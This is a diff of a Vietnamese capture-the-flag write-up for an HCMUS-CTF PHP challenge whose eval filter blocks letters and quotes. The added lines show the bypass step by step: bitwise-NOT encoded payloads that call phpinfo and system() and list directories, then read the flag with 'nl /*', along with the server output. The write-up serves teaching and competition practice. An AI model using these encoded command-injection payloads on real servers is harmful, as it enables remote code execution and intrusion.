@@ -45,3 +45,12 @@ May mắn là tìm ra ngay flag lun:
 > Alphabetic character and quote is not allowed here
 + Mình nghĩ ngay tới WAF bypass. Nhưng dù có search google thế nào cũm bị giới hạn kí tự và chặn mất quote
 + Hơn 1 ngày suy nghĩ thì mình nhận được 1 hint là '~'. Là gì? Search google một hồi thì biết được đó là đảo bit trong php
++ ![image](https://user-images.githubusercontent.com/58381595/119289646-2a314680-bc75-11eb-9e46-b204ac314818.png)
++ Vậy nếu ta đảo ngược lại lần nữa ko phải là sẽ về chuỗi cũ sao. Thử đảo phpinfo thành ' %8F%97%8F%96%91%99%90 ' rồi gửi ' (~%8F%97%8F%96%91%99%90)() ' Thì quả thật lệnh phpinfo() đã được thực hiện
++ system('ls -l') xem có gì nào : (~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D2%93)
+> Warning: Use of undefined constant ���ғ - assumed '���ғ' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
+total 4 -rwxrw-r--. 1 www-data root 856 May 18 11:52 index.php drwxr-xr-x. 1 www-data root 23 May 18 11:52 static drwxr-xr-x. 1 www-data root 23 May 18 11:52 static
++ Ra ngoài gốc lun xem có gì
+> Warning: Use of undefined constant ���ғ�� - assumed '���ғ��' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
+total 4 drwxr-xr-x. 1 root root 28 May 12 12:48 bin drwxr-xr-x. 2 root root 6 Mar 19 23:44 boot drwxr-xr-x. 5 root root 360 May 23 13:13 dev drwxr-xr-x. 1 root root 66 May 23 13:13 etc -rwxrw-r--. 1 root root 25 May 18 11:52 fl4ggggH3reeeeeeeeeee drwxr-xr-x. 2 root root 6 Mar 19 23:44 home drwxr-xr-x. 1 root root 21 May 12 12:48 lib drwxr-xr-x. 2 root root 34 May 11 00:00 lib64 drwxr-xr-x. 2 root root 6 May 11 00:00 media drwxr-xr-x. 2 root root 6 May 11 00:00 mnt drwxr-xr-x. 2 root root 6 May 11 00:00 opt dr-xr-xr-x. 580 root root 0 May 23 13:13 proc drwx------. 1 root root 6 May 12 13:41 root drwxr-xr-x. 1 root root 36 May 23 13:13 run drwxr-xr-x. 1 root root 20 May 12 12:48 sbin drwxr-xr-x. 2 root root 6 May 11 00:00 srv dr-xr-xr-x. 13 root root 0 May 11 11:41 sys drwxrwxrwt. 1 root root 6 May 12 13:41 tmp drwxr-xr-x. 1 root root 19 May 11 00:00 usr drwxr-xr-x. 1 root root 17 May 12 12:43 var drwxr-xr-x. 1 root root 17 May 12 12:43 var
++ cat flag thui: system('nl /*') -> HCMUS-CTF{d4ngErous_eVal}
